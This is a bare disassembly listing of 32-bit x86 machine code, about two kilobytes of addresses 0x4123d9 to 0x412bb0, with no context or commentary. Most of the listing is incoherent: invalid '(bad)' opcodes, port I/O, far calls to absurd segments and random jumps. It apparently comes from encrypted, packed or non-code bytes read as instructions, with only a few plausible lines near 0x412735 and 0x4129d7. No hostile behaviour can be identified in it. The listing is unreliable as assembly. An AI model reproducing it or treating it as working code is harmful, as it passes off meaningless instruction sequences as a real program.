  4123d9:	stos   BYTE PTR es:[edi],al
  4123da:	mov    dl,BYTE PTR [esi]
  4123dc:	sar    BYTE PTR [ebp-0x34],0x13
  4123e0:	in     eax,0x8c
  4123e2:	inc    ebp
  4123e3:	mov    ebp,0x225d93bc
  4123e8:	fwait
  4123e9:	(bad)  
  4123ea:	pop    ebx
  4123eb:	adc    edx,ebx
  4123ed:	sub    DWORD PTR [edi+0x5f],0x69
  4123f1:	cld    
  4123f2:	mov    ch,bl
  4123f4:	adc    DWORD PTR [eax-0x62],edi
  4123f7:	sar    BYTE PTR [ecx],cl
  4123f9:	cld    
  4123fa:	mov    BYTE PTR [edi],ch
  4123fc:	shl    DWORD PTR [esi-0x43],cl
  4123ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412400:	sbb    al,0x2d
  412402:	fwait
  412403:	scas   eax,DWORD PTR es:[edi]
  412404:	in     eax,0xa1
  412406:	inc    esi
  412407:	pop    edi
  412408:	add    DWORD PTR [ebx+0x6c382f2e],ecx
  41240e:	cmp    ebp,ecx
  412410:	or     eax,0xdd1fad2e
  412415:	(bad)  
  412416:	fisttp QWORD PTR [ebp+0x1e]
  412419:	xchg   esi,eax
  41241a:	pop    ebp
  41241b:	outs   dx,DWORD PTR ds:[esi]
  41241c:	dec    ebp
  41241d:	mov    dl,0xc1
  41241f:	cmp    ah,cl
  412421:	mov    ah,0x55
  412423:	in     eax,0x97
  412425:	add    DWORD PTR ds:0xa6b6b9a9,edi
  41242b:	mov    bl,0x5f
  41242d:	fidiv  DWORD PTR [edx-0x16a712d9]
  412433:	cli    
  412434:	mov    cl,BYTE PTR [ecx]
  412436:	call   0xfdcf:0xcdbf6e24
  41243d:	inc    ebp
  41243e:	inc    ecx
  41243f:	push   0x3758d23
  412444:	mov    ebp,0x9b1a8d33
  412449:	cmp    al,0x2b
  41244b:	mov    esp,0x41639b87
  412450:	xchg   ch,dh
  412452:	outs   dx,DWORD PTR ds:[esi]
  412453:	retf   
  412454:	or     eax,ecx
  412456:	js     0x4123ee
  412458:	lock pop eax
  41245a:	js     0x412438
  41245c:	or     bp,WORD PTR [edx]
  41245f:	sub    ah,BYTE PTR [edx-0x7fd5b783]
  412465:	imul   edi,DWORD PTR [ebx+ecx*1+0x7a],0xffffffd9
  41246a:	stos   BYTE PTR es:[edi],al
  41246b:	mov    esp,0xb8a1cd03
  412470:	add    BYTE PTR [edi+ebp*4-0x1085d1b],dh
  412477:	mov    esp,0x5e8017b5
  41247c:	dec    ebx
  41247d:	ds push eax
  41247f:	scas   eax,DWORD PTR es:[edi]
  412480:	sub    BYTE PTR [esi-0x43e06a7c],0xbb
  412487:	into   
  412488:	or     eax,0xe8d45a3d
  41248d:	pushf  
  41248e:	call   0xd465:0xab408829
  412495:	xor    edi,ebp
  412497:	les    ebp,FWORD PTR [ebp+esi*2-0xf]
  41249b:	aas    
  41249c:	dec    BYTE PTR [eax]
  41249e:	fcomp  DWORD PTR [eax-0x9]
  4124a1:	add    bh,cl
  4124a3:	mov    eax,0xefec5fdc
  4124a8:	outs   dx,DWORD PTR ds:[esi]
  4124a9:	xchg   BYTE PTR [ecx-0x7c161bab],cl
  4124af:	add    al,BYTE PTR [eax]
  4124b1:	add    bh,cl
  4124b3:	ret    
  4124b4:	rol    esi,0xd1
  4124b7:	(bad)  
  4124b8:	fcmovnu st,st(1)
  4124ba:	mov    ebx,0xb71ebe60
  4124bf:	mov    al,ds:0x6e3d6c5b
  4124c4:	js     0x41253e
  4124c6:	in     eax,0x7e
  4124c8:	js     0x412542
  4124ca:	es jae 0x412547
  4124cd:	int    0xc3
  4124cf:	je     0x4124b6
  4124d1:	retf   
  4124d2:	jge    0x412553
  4124d4:	pop    ss
  4124d5:	ret    0xcb3e
  4124d8:	sbb    al,al
  4124da:	jnp    0x41254f
  4124dc:	xchg   BYTE PTR [ecx+edi*1],bh
  4124df:	or     ah,bl
  4124e1:	jg     0x1bb226cd
  4124e7:	(bad)  
  4124e9:	(bad)  
  4124ea:	adc    esp,ecx
  4124ec:	xor    edx,0xd8a1a6dc
  4124f2:	mov    dh,0x7c
  4124f4:	jmp    0x105a:0x7be37616
  4124fb:	pop    eax
  4124fc:	mov    cl,0xe9
  4124fe:	jnp    0x412540
  412500:	loopne 0x41251f
  412502:	sbb    dh,BYTE PTR [ebx+0x2aca6e0]
  412508:	add    edi,esi
  41250a:	add    esp,DWORD PTR [edx-0x5853f237]
  412510:	test   eax,0x568806cf
  412515:	pop    edx
  412516:	adc    al,0x79
  412518:	mov    esp,DWORD PTR ss:[edi+ebp*2+0x35]
  41251d:	push   ds
  41251e:	inc    esi
  41251f:	jb     0x4124a6
  412521:	xchg   esp,eax
  412522:	mov    bh,BYTE PTR [esi+edi*1+0x67]
  412526:	add    DWORD PTR [eax],ebx
  412528:	or     al,0x52
  41252a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41252b:	int3   
  41252c:	jbe    0x4124d5
  41252e:	dec    esi
  41252f:	into   
  412530:	in     eax,dx
  412531:	fsubr  st(4),st
  412533:	and    ch,dh
  412535:	cmp    al,0x43
  412537:	push   ss
  412538:	adc    al,0xed
  41253a:	mov    edx,DWORD PTR [ecx-0x2ccdf701]
  412540:	lods   al,BYTE PTR ds:[esi]
  412541:	imul   esp,edi,0x68242d50
  412547:	mov    ah,0x5b
  412549:	lock and cl,cl
  41254c:	push   0xffffff8a
  41254e:	sti    
  41254f:	sub    eax,0x630c8d5a
  412554:	xor    ebp,DWORD PTR fs:[ecx-0x7ee3a6ea]
  41255b:	aas    
  41255c:	mov    bl,0x3b
  41255e:	mov    esi,0x147ed811
  412563:	pcmpgtd mm6,QWORD PTR [esi]
  412566:	(bad)  
  412567:	dec    al
  412569:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41256a:	sti    
  41256b:	dec    edi
  41256c:	mov    bl,BYTE PTR [edi]
  41256e:	jnp    0x412597
  412570:	popf   
  412571:	(bad)  
  412572:	hlt    
  412573:	or     eax,0x3be62a0
  412578:	(bad)  
  412579:	push   ss
  41257a:	adc    ebp,eax
  41257c:	pop    ecx
  41257d:	mov    ch,0x7b
  41257f:	jmp    0x412579
  412581:	sub    bl,dl
  412583:	cmp    DWORD PTR [ecx-0x20516400],eax
  412589:	ret    0x7997
  41258c:	test   DWORD PTR [ebx],ecx
  41258e:	aam    0x77
  412590:	xor    eax,0x55a6ef36
  412595:	sbb    ah,bl
  412597:	iret   
  412598:	call   0x4910:0xb6d25f5d
  41259f:	mov    dh,0xcd
  4125a1:	mov    BYTE PTR [esi-0x63746bc4],bh
  4125a7:	push   ds
  4125a8:	pop    ds
  4125a9:	jno    0x4125ff
  4125ab:	fwait
  4125ac:	mov    ecx,DWORD PTR [esi+edx*1]
  4125af:	mov    esi,0xdc62c9a9
  4125b4:	jp     0x412560
  4125b6:	repz mov ebx,0x4be835fc
  4125bc:	dec    ebx
  4125bd:	cmp    BYTE PTR [edx+0x3c09eb8e],cl
  4125c3:	test   DWORD PTR [eax],esi
  4125c5:	xor    DWORD PTR [ebx+0xb],edx
  4125c8:	pop    eax
  4125c9:	(bad)
  4125ce:	push   eax
  4125cf:	aam    0x64
  4125d1:	cmp    al,0x8e
  4125d3:	inc    ebp
  4125d4:	cwde   
  4125d5:	inc    esp
  4125d6:	fldenv [edx+0x113e0048]
  4125dc:	jl     0x4125b8
  4125de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4125df:	in     al,0xeb
  4125e1:	aam    0x6
  4125e3:	cmp    ebp,0x4a9eee0e
  4125e9:	push   0x61
  4125eb:	xor    ebx,0x346e0cec
  4125f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4125f2:	mov    eax,0x874ccdbe
  4125f7:	fistp  DWORD PTR [edx+0x12]
  4125fa:	adc    BYTE PTR [edx-0xef4dede],cl
  412600:	enter  0x2db5,0xaa
  412604:	mov    ds,WORD PTR [ebx+0x4a]
  412607:	push   edi
  412608:	and    al,BYTE PTR [ebx]
  41260a:	jle    0x4125d2
  41260c:	fild   WORD PTR [ebx]
  41260e:	xchg   ecx,eax
  41260f:	jp     0x41261b
  412611:	cmp    eax,0xcbeb99c1
  412616:	clc    
  412617:	fs jne 0x412676
  41261a:	scas   eax,DWORD PTR es:[edi]
  41261b:	aas    
  41261c:	xchg   DWORD PTR [ebx+0xb],edx
  41261f:	xchg   edi,eax
  412620:	arpl   WORD PTR [edx-0x3d4cdb10],bp
  412626:	mov    ds:0xbe530991,al
  41262b:	arpl   sp,bp
  41262d:	shl    BYTE PTR [esi-0x1d],1
  412630:	rol    BYTE PTR [edx],cl
  412632:	test   DWORD PTR [esi],edx
  412634:	and    ah,dh
  412636:	retf   
  412637:	iret   
  412638:	jnp    0x41260d
  41263a:	fld    QWORD PTR [edx]
  41263c:	adc    eax,0x128580d2
  412641:	lds    esi,FWORD PTR [edx+0xee9c109]
  412647:	arpl   WORD PTR [ecx+eax*1-0x5f],cx
  41264b:	and    DWORD PTR [ebx-0x7eb4aa87],edi
  412651:	test   BYTE PTR [edx],ah
  412653:	xchg   BYTE PTR [ebx],ch
  412655:	in     eax,dx
  412656:	jb     0x4126bc
  412658:	dec    esp
  412659:	xor    eax,0x56fe531c
  41265e:	fcom   DWORD PTR [edx-0x52]
  412661:	mov    edi,0x9ef682e0
  412666:	inc    ebp
  412667:	mov    edx,0x63cc2b09
  41266c:	shr    DWORD PTR [ebx],cl
  41266e:	in     al,0x1b
  412670:	sbb    BYTE PTR [eax],ch
  412672:	ret    
  412673:	pop    eax
  412674:	xchg   esi,eax
  412675:	xchg   BYTE PTR [edi],ah
  412677:	pop    esi
  412678:	clc    
  412679:	mov    eax,ds:0x27dce7b1
  41267e:	lahf   
  41267f:	sbb    DWORD PTR [edi*1-0x2094dc56],ebp
  412686:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412687:	aaa    
  412688:	dec    esp
  412689:	call   0x599389f2
  41268e:	mov    cl,0xc4
  412690:	call   0x2505:0x6e7b9426
  412697:	repnz push esi
  412699:	mov    dh,0xf1
  41269b:	xchg   edi,eax
  41269c:	test   al,0xb3
  41269e:	sbb    BYTE PTR [ebx-0x2f],0x98
  4126a2:	cli    
  4126a3:	sbb    eax,0xb8fa3081
  4126a8:	adc    eax,0x3d0619a4
  4126ad:	pop    ss
  4126ae:	hlt    
  4126af:	inc    ecx
  4126b0:	mov    edx,eax
  4126b2:	fst    DWORD PTR [esi]
  4126b4:	bound  edx,QWORD PTR [eax+0x45112ae1]
  4126ba:	jno    0x412676
  4126bc:	js     0x412673
  4126be:	push   esp
  4126bf:	cmp    eax,0x617f5eaf
  4126c4:	or     cl,0x2e
  4126c7:	push   edi
  4126c8:	fcom   DWORD PTR [ebp-0x2d]
  4126cb:	gs mov edx,0xe99af4e1
  4126d1:	loop   0x41271a
  4126d3:	mov    al,0xd7
  4126d5:	fucom  st(5)
  4126d7:	(bad)  
  4126d8:	mov    dh,0x59
  4126da:	mov    eax,0xce571053
  4126df:	lods   eax,DWORD PTR ds:[esi]
  4126e0:	arpl   WORD PTR [edi-0x6b],si
  4126e3:	sub    eax,0xfe8020fd
  4126e8:	push   esp
  4126e9:	cmp    bl,BYTE PTR [esi+0x4a570e01]
  4126ef:	lahf   
  4126f0:	push   cs
  4126f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4126f2:	sbb    ch,BYTE PTR [ebx+0x4a8562a]
  4126f8:	push   ds
  4126f9:	inc    ebx
  4126fa:	pop    edx
  4126fb:	leave  
  4126fc:	xor    BYTE PTR ds:0x628badcc,al
  412702:	(bad)
  412705:	out    0xe3,eax
  412707:	and    DWORD PTR [ecx-0x65a95b63],edi
  41270d:	int    0xec
  41270f:	push   ss
  412710:	mov    al,ds:0x8bc736c3
  412715:	test   eax,0x6da93cf5
  41271a:	daa    
  41271b:	call   0x41ba:0xbd70eee8
  412722:	push   ebx
  412723:	pop    ecx
  412724:	sar    ch,0x42
  412727:	adc    DWORD PTR [ebx+edx*2+0x1e3cfd87],0x56
  41272f:	jb     0x4126cc
  412731:	dec    ebx
  412732:	xchg   ebx,eax
  412733:	jle    0x412740
  412735:	mov    DWORD PTR [ebp-0xc],0xf89c8539
  41273c:	mov    DWORD PTR [ebp-0x44],0xf89c853a
  412743:	jmp    0x4129cb
  412748:	int    0xcb
  41274a:	ror    esp,0xd9
  41274d:	fcmove st,st(5)
  41274f:	leave  
  412750:	sub    al,0xaa
  412752:	(bad)  
  412754:	lahf   
  412755:	cmp    ebx,edx
  412757:	pop    esi
  412758:	stos   BYTE PTR es:[edi],al
  412759:	ins    BYTE PTR es:[edi],dx
  41275a:	js     0x4127d4
  41275c:	in     eax,0x7e
  41275e:	js     0x4127d8
  412760:	(bad)  
  412762:	xchg   edi,eax
  412763:	int3   
  412764:	mov    edx,edi
  412766:	cmp    al,0x59
  412768:	out    0x15,al
  41276a:	sbb    esp,DWORD PTR [ecx+0xe]
  41276d:	(bad)  
  41276e:	mov    ah,0x71
  412770:	push   ebx
  412771:	inc    esi
  412772:	loop   0x4127d1
  412774:	push   0x61
  412776:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412777:	aaa    
  412778:	mov    ebp,0xe2d63139
  41277d:	mov    ds:0x92aa66d5,eax
  412782:	xchg   edx,eax
  412783:	sub    eax,0xc36ab4a6
  412788:	aas    
  412789:	pop    ss
  41278a:	push   ds
  41278b:	push   ecx
  41278c:	outs   dx,DWORD PTR ds:[esi]
  41278d:	push   0x40
  41278f:	push   edi
  412790:	mov    dl,0xd8
  412792:	mov    bl,0x74
  412794:	dec    edx
  412795:	sub    DWORD PTR ds:0x52ce2196,esp
  41279b:	fwait
  41279c:	shr    dh,cl
  41279e:	cli    
  41279f:	(bad)
  4127a2:	ins    BYTE PTR es:[edi],dx
  4127a3:	retf   0x845e
  4127a6:	xchg   BYTE PTR [bx+si+0x43],ch
  4127aa:	push   ecx
  4127ab:	mov    BYTE PTR [edx-0x2d03abb4],ch
  4127b1:	adc    al,0xbf
  4127b3:	lods   al,BYTE PTR ds:[esi]
  4127b4:	mov    esp,0x7789edaa
  4127b9:	jno    0x41278b
  4127bb:	push   ecx
  4127bc:	arpl   WORD PTR [edi-0x24642a34],bp
  4127c2:	jge    0x412839
  4127c4:	imul   esp,ebp,0xa21a2aa0
  4127ca:	rcr    ebx,0xd1
  4127cd:	out    0xa4,eax
  4127cf:	xlat   BYTE PTR ds:[ebx]
  4127d0:	outs   dx,DWORD PTR ds:[esi]
  4127d1:	loope  0x41284d
  4127d3:	stc    
  4127d4:	sar    eax,cl
  4127d6:	adc    eax,0x9f125ad7
  4127db:	pop    ss
  4127dc:	lds    ecx,FWORD PTR [ebp-0x4ec16c4b]
  4127e2:	stos   DWORD PTR es:[edi],eax
  4127e3:	ret    0xf191
  4127e6:	sub    BYTE PTR [ecx-0xf21cd84],dl
  4127ec:	fwait
  4127ed:	xlat   BYTE PTR ds:[ebx]
  4127ee:	fidivr DWORD PTR [ebx]
  4127f0:	mov    ds:0x49b92f3,eax
  4127f5:	cwde   
  4127f6:	(bad)  
  4127f7:	in     eax,0x23
  4127f9:	or     al,0x6a
  4127fb:	les    esi,FWORD PTR [edi]
  4127fd:	dec    edi
  4127fe:	outs   dx,DWORD PTR ds:[esi]
  4127ff:	sub    al,0x57
  412801:	inc    esi
  412802:	in     al,dx
  412803:	cdq    
  412804:	pop    ss
  412805:	xchg   ecx,eax
  412806:	gs (bad) 
  412808:	sbb    ebp,DWORD PTR [edi-0x29]
  41280b:	outs   dx,DWORD PTR ds:[esi]
  41280c:	pop    edx
  41280d:	jge    0x4127a6
  41280f:	gs jnp 0x412818
  412812:	mov    edi,0xe87f6047
  412817:	inc    eax
  412818:	loopne 0x412852
  41281a:	mov    ch,0x9f
  41281c:	retf   0xac60
  41281f:	(bad)  [ebx+0x23b68438]
  412825:	add    al,0x50
  412827:	lods   eax,DWORD PTR ds:[esi]
  412828:	aaa    
  412829:	push   es
  41282a:	push   ds
  41282b:	fcom   QWORD PTR [esi+0x5e]
  41282e:	clc    
  41282f:	inc    eax
  412830:	inc    esp
  412831:	loope  0x4128b2
  412833:	dec    edi
  412834:	adc    al,0xa4
  412836:	cmp    BYTE PTR [ebp-0x2e67b093],al
  41283c:	je     0x412832
  41283e:	loopne 0x412825
  412840:	jge    0x41286e
  412842:	int    0x57
  412844:	adc    eax,0x4b3d2be8
  412849:	jo     0x4128b9
  41284b:	(bad)  
  41284c:	push   ebx
  41284d:	fmul   DWORD PTR [edx]
  41284f:	(bad)  
  412850:	cmc    
  412851:	out    dx,eax
  412852:	push   0x73
  412854:	pop    es
  412855:	push   cs
  412856:	rcr    DWORD PTR [esi+0x44],1
  412859:	imul   ecx,DWORD PTR [esp+eax*1],0x58
  41285d:	xchg   edx,eax
  41285e:	mov    esp,0xd5bfb66e
  412863:	xchg   ebx,eax
  412864:	xchg   ch,dl
  412866:	xchg   ecx,eax
  412867:	mov    ecx,0xaf082f91
  41286c:	and    eax,0x1e0bde17
  412871:	shl    BYTE PTR [esi],cl
  412873:	sti    
  412874:	dec    ecx
  412875:	mov    DWORD PTR [edx+0x1a11da23],0xc5885217
  41287f:	mov    edx,0xe652b814
  412884:	mov    ebp,0xdd8a5ac
  412889:	mov    ebp,0x867ca5f3
  41288e:	mul    eax
  412890:	fstp   QWORD PTR [ebp-0x65]
  412893:	sqrtps xmm2,XMMWORD PTR [esi+ebp*2+0x4786be2a]
  41289b:	arpl   di,cx
  41289d:	and    BYTE PTR ds:[ebx],cl
  4128a0:	test   BYTE PTR [edx+0x22],bh
  4128a3:	adc    edi,DWORD PTR [edi]
  4128a5:	loopne 0x4128a3
  4128a7:	jns    0x4128bc
  4128a9:	pop    ebx
  4128aa:	mov    al,BYTE PTR [ecx-0x42fd1e8]
  4128b0:	inc    esi
  4128b1:	and    al,0x84
  4128b3:	pop    edx
  4128b4:	adc    al,0xe5
  4128b6:	das    
  4128b7:	repz dec eax
  4128b9:	scas   eax,DWORD PTR es:[edi]
  4128ba:	lds    edx,FWORD PTR [edi-0x7]
  4128bd:	call   0xd15a53d
  4128c2:	jge    0x412857
  4128c4:	inc    edx
  4128c5:	push   ebp
  4128c6:	sub    dl,ah
  4128c8:	xchg   esp,eax
  4128c9:	jb     0x412857
  4128cb:	ins    BYTE PTR es:[edi],dx
  4128cc:	cmp    bh,bh
  4128ce:	jno    0x412855
  4128d0:	mov    DWORD PTR [esi+0x4e],ebx
  4128d3:	scas   eax,DWORD PTR es:[edi]
  4128d4:	push   edx
  4128d5:	daa    
  4128d6:	ret    0x5b97
  4128d9:	mov    bl,0x9c
  4128db:	repz aas 
  4128dd:	jle    0x412920
  4128df:	out    0xff,al
  4128e1:	or     DWORD PTR [edx+0x36e50a2],0x2310fbba
  4128eb:	and    bh,al
  4128ed:	or     eax,0xf145aeef
  4128f2:	lock mov ah,0x7c
  4128f5:	call   0x920bd209
  4128fa:	int    0x86
  4128fc:	aas    
  4128fd:	cmp    eax,0x9811596d
  412902:	and    eax,0xa47653e
  412907:	pop    esi
  412908:	adc    dh,cl
  41290a:	ins    BYTE PTR es:[edi],dx
  41290b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41290c:	xor    dl,dh
  41290e:	cwde   
  41290f:	adc    eax,ebp
  412911:	push   es
  412912:	outs   dx,BYTE PTR ds:[esi]
  412913:	stos   BYTE PTR es:[edi],al
  412914:	jns    0x4128ad
  412916:	pop    edi
  412917:	push   ecx
  412918:	ficomp WORD PTR [esi+ebp*8]
  41291b:	call   0xaf5da485
  412920:	push   cs
  412921:	dec    BYTE PTR [ebx-0x20]
  412924:	dec    esp
  412925:	mov    BYTE PTR [edi-0x7f3b6cc2],0x2f
  41292c:	ins    DWORD PTR es:[edi],dx
  41292d:	fst    QWORD PTR [edi]
  41292f:	jae    0x41296a
  412931:	lds    esi,FWORD PTR [eax+0x4f]
  412934:	push   esi
  412935:	adc    edi,DWORD PTR [ebx+ecx*4+0x60]
  412939:	mov    eax,0xb701e1a
  41293e:	mov    edi,0xf4b558d7
  412943:	in     al,dx
  412944:	fisub  DWORD PTR fs:[ebp-0x2415b879]
  41294b:	cmp    edi,ebx
  41294d:	pop    ss
  41294e:	bound  ebx,QWORD PTR [esi+0xadbce95]
  412954:	cmp    ecx,0xa9f66d6
  41295a:	or     BYTE PTR [esi+0x69],bh
  41295d:	or     edx,DWORD PTR [eax+0xb]
  412960:	leavew 
  412962:	out    dx,al
  412963:	sbb    bh,ah
  412965:	mov    eax,ds:0x220593ab
  41296a:	or     ah,BYTE PTR [eax-0x46]
  41296d:	(bad)  
  41296e:	pop    edi
  41296f:	aam    0x6a
  412971:	aad    0x65
  412973:	xor    eax,0x931d34e4
  412978:	je     0x41290e
  41297a:	mov    eax,0x953c8a04
  41297f:	cmp    dh,dh
  412981:	pop    edx
  412982:	adc    al,0x67
  412984:	(bad)  
  412985:	inc    eax
  412986:	pop    ebp
  412987:	mov    DWORD PTR [esi],eax
  412989:	jae    0x4129a8
  41298b:	mov    ds,esi
  41298d:	sbb    BYTE PTR [esi+ebx*2-0x2700ab8d],cl
  412994:	lods   al,BYTE PTR ds:[esi]
  412995:	dec    ecx
  412996:	pop    ecx
  412997:	es mov edx,0x36a1637c
  41299d:	mov    cl,0xdc
  41299f:	push   ds
  4129a0:	pop    esi
  4129a1:	vorpd  ymm1,ymm2,YMMWORD PTR [ebx]
  4129a5:	dec    ecx
  4129a6:	xchg   BYTE PTR [esi],ch
  4129a8:	dec    edi
  4129a9:	hlt    
  4129aa:	mov    ecx,0xbb40e6c8
  4129af:	add    BYTE PTR [ebp+0x35],dh
  4129b2:	jge    0x41297a
  4129b4:	or     BYTE PTR [edx],dh
  4129b6:	out    dx,eax
  4129b7:	cmc    
  4129b8:	mov    ah,0xf
  4129ba:	mov    ecx,DWORD PTR [ecx+0x4b]
  4129bd:	lea    ecx,[esi]
  4129bf:	loope  0x412969
  4129c1:	pusha  
  4129c2:	pushf  
  4129c3:	mov    ah,0x81
  4129c5:	mov    gs,WORD PTR [ebx-0x34]
  4129c8:	int    0xac
  4129ca:	mov    edi,0x33e8558b
  4129cf:	rol    BYTE PTR [ebx],1
  4129d1:	shr    ecx,1
  4129d3:	cwde   
  4129d4:	sldt   WORD PTR [eax]
  4129d7:	mov    edx,DWORD PTR [ebp-0x18]
  4129da:	xor    edx,eax
  4129dc:	add    edx,DWORD PTR [ebp-0x14]
  4129df:	jmp    0x412c67
  4129e4:	(bad)
  4129e7:	ret    0xc1ca
  4129ea:	(bad)
  4129ed:	xlat   BYTE PTR ds:[ebx]
  4129ee:	data16 ja 0x4129d6
  4129f1:	int    0x74
  4129f3:	xchg   ebx,eax
  4129f4:	pop    ss
  4129f5:	jno    0x412a6f
  4129f7:	js     0x4129de
  4129f9:	jle    0x412a73
  4129fb:	js     0x412a38
  4129fd:	push   esp
  4129fe:	xchg   edi,eax
  4129ff:	and    al,0x2c
  412a01:	retf   
  412a02:	sahf   
  412a03:	lods   al,BYTE PTR ds:[esi]
  412a04:	or     ah,BYTE PTR [esi+0x79]
  412a07:	fst    DWORD PTR [ebx+esi*8+0x4c]
  412a0b:	cli    
  412a0c:	sti    
  412a0d:	fidiv  DWORD PTR [edi-0xd748c0c]
  412a13:	push   es
  412a14:	inc    ch
  412a16:	je     0x412a66
  412a18:	inc    edx
  412a19:	mov    edi,0x95cbab4b
  412a1e:	pop    ds
  412a1f:	cli    
  412a20:	sub    al,0xe4
  412a22:	mov    dh,0x43
  412a24:	dec    ebp
  412a25:	adc    DWORD PTR ds:0x89e643fb,esp
  412a2b:	sti    
  412a2c:	ins    DWORD PTR es:[edi],dx
  412a2d:	pusha  
  412a2e:	xchg   edx,eax
  412a2f:	stos   BYTE PTR es:[edi],al
  412a30:	jo     0x412a3a
  412a32:	inc    ecx
  412a33:	pop    ebp
  412a34:	jb     0x412a95
  412a36:	pop    edx
  412a37:	and    DWORD PTR [esi+0x3e33c5f3],0xffffffa6
  412a3e:	test   eax,0x8ce16ada
  412a43:	mov    ebx,0xcb1a5d01
  412a48:	pop    ebp
  412a49:	add    al,ah
  412a4b:	aaa    
  412a4c:	add    ebx,DWORD PTR [ebx]
  412a4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a4f:	fisttp DWORD PTR [edx+0x46]
  412a52:	ret    
  412a53:	xchg   esp,eax
  412a54:	adc    DWORD PTR [edx],edi
  412a56:	fs call 0x55f:0x49cee8ac
  412a5e:	inc    edx
  412a5f:	jp     0x4129e8
  412a61:	dec    esp
  412a62:	xchg   esi,eax
  412a63:	sar    BYTE PTR ds:0x2dd499f9,0x38
  412a6a:	add    eax,0x6b886c9f
  412a6f:	mov    cl,BYTE PTR [eax-0x1d]
  412a72:	or     eax,0x842dcb56
  412a77:	fdiv   DWORD PTR [edi]
  412a79:	out    dx,eax
  412a7a:	lock mov cs,WORD PTR [edx]
  412a7d:	or     al,0x20
  412a7f:	add    edi,DWORD PTR [edi-0x22]
  412a82:	dec    eax
  412a83:	test   eax,0xe9e6c3cb
  412a88:	mov    DWORD PTR [edx],ecx
  412a8a:	retf   
  412a8b:	xor    ebp,0x15
  412a8e:	pop    esi
  412a8f:	mov    ds:0xac17b2dc,al
  412a94:	xchg   ecx,eax
  412a95:	sbb    DWORD PTR [eax+0x58],eax
  412a98:	stos   DWORD PTR es:[edi],eax
  412a99:	mov    BYTE PTR [ecx+0x18],ch
  412a9c:	sub    eax,0x4b890933
  412aa1:	rol    BYTE PTR [esi],cl
  412aa3:	dec    esp
  412aa4:	push   ebp
  412aa5:	dec    esp
  412aa7:	xchg   edx,eax
  412aa8:	adc    esp,DWORD PTR [edi+0x17]
  412aab:	add    DWORD PTR [ebp-0x1a],esp
  412aae:	mov    al,ds:0x160f21c2
  412ab3:	aam    0x3e
  412ab5:	hlt    
  412ab6:	aad    0xbb
  412ab8:	icebp  
  412ab9:	cmc    
  412aba:	call   0x524b:0x38f5aee1
  412ac1:	fs rcr esi,0x5c
  412ac5:	mov    ch,0xdd
  412ac7:	cs pop edi
  412ac9:	and    al,0x74
  412acb:	rol    ebp,cl
  412acd:	cmc    
  412ace:	xor    eax,0x25455938
  412ad3:	jbe    0x412aed
  412ad5:	aam    0xc3
  412ad7:	jbe    0x412a85
  412ad9:	int3   
  412ada:	std    
  412adb:	push   0x63b28147
  412ae0:	sub    al,0x93
  412ae2:	sub    eax,0xf0c25c12
  412ae7:	jle    0x412add
  412ae9:	add    BYTE PTR [esi],ch
  412aeb:	dec    eax
  412aec:	xor    esi,DWORD PTR [edx]
  412aee:	mov    bh,0xe3
  412af0:	(bad)
  412af4:	push   ebx
  412af5:	jae    0x412ac4
  412af7:	add    al,BYTE PTR [edi]
  412af9:	jno    0x412b66
  412afb:	jg     0x412b3c
  412afd:	daa    
  412afe:	ss xchg edi,eax
  412b00:	stc    
  412b01:	iret   
  412b02:	mov    ah,0xff
  412b04:	sbb    al,0x17
  412b06:	nop
  412b07:	xor    DWORD PTR [eax*8-0x12ca8304],0xd55f5802
  412b12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412b13:	inc    ebx
  412b14:	and    DWORD PTR [esi-0x5b],ebx
  412b17:	inc    ebp
  412b18:	ins    DWORD PTR es:[edi],dx
  412b19:	fdiv   QWORD PTR [edx+0xe]
  412b1c:	ins    BYTE PTR es:[edi],dx
  412b1d:	inc    esi
  412b1e:	pop    ebx
  412b1f:	(bad)  
  412b20:	addr16 dec eax
  412b22:	push   cs
  412b23:	lock push 0xda168638
  412b29:	popf   
  412b2a:	in     eax,dx
  412b2b:	sbb    ah,BYTE PTR [esi]
  412b2d:	adc    eax,0x2576866d
  412b32:	xchg   ebp,eax
  412b33:	aas    
  412b34:	mov    esp,0xbd05fc9a
  412b39:	(bad)  
  412b3b:	cwde   
  412b3c:	aaa    
  412b3d:	neg    edi
  412b3f:	out    0x70,al
  412b41:	add    al,BYTE PTR [edi+0x67]
  412b44:	add    BYTE PTR [eax],ch
  412b46:	popa   
  412b47:	mov    ecx,0x6c4be738
  412b4c:	pop    eax
  412b4d:	sub    eax,0x8cd6a212
  412b52:	test   al,0x69
  412b54:	adc    ah,BYTE PTR [eax]
  412b56:	outs   dx,DWORD PTR ds:[esi]
  412b57:	jg     0x412b2e
  412b59:	cmp    al,0x84
  412b5b:	daa    
  412b5c:	addr16 ret 
  412b5e:	sub    eax,0xcd9f00e
  412b63:	xor    DWORD PTR [ecx],0x174f419e
  412b69:	jbe    0x412b63
  412b6b:	cmp    ebx,esp
  412b6d:	shl    BYTE PTR [ebx-0x5f485248],cl
  412b73:	inc    ecx
  412b74:	sahf   
  412b75:	stos   BYTE PTR es:[edi],al
  412b76:	dec    ecx
  412b77:	push   ds
  412b78:	pop    esp
  412b79:	out    0x1b,eax
  412b7b:	sub    al,0xfb
  412b7d:	std    
  412b7e:	jmp    0x4501:0x44ce7f85
  412b85:	bound  edx,QWORD PTR [ebp+0x5a2e1ff9]
  412b8b:	mov    bh,0x84
  412b8d:	in     eax,0x50
  412b8f:	cwde   
  412b90:	in     al,dx
  412b91:	retf   
  412b92:	mov    bh,0x9
  412b94:	cwde   
  412b95:	(bad)  
  412b96:	mov    ds:0xbf2cd557,al
  412b9b:	jb     0x412b22
  412b9d:	fcmovu st,st(3)
  412b9f:	mov    dh,0xc7
  412ba1:	jecxz  0x412c19
  412ba3:	add    DWORD PTR [ebx+0x105e6c55],ebp
  412ba9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412baa:	mov    edi,edi
  412bac:	rcl    BYTE PTR [edi-0x71],0xb6
  412bb0:	push   ds
